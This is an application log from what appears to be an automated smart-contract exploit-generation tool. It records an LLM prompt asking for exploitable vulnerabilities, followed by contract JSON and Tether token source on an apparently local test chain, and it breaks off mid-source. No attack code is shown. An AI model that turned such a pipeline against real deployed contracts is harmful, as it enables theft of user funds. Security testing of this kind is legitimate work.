2025-06-23 15:08:02,017 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 15:08:02,042 - app.modules.attack_generator - INFO - Received response from OpenAI API in 3.83 seconds
2025-06-23 15:08:02,048 - app.modules.attack_generator - INFO - Attack code generation completed in 3.83 seconds
2025-06-23 15:08:02,051 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 1084
2025-06-23 15:08:02,054 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 45.78 seconds
2025-06-23 15:08:02,056 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-23 15:08:02,070 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpn0n66fsk.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873535860000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873535860000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint 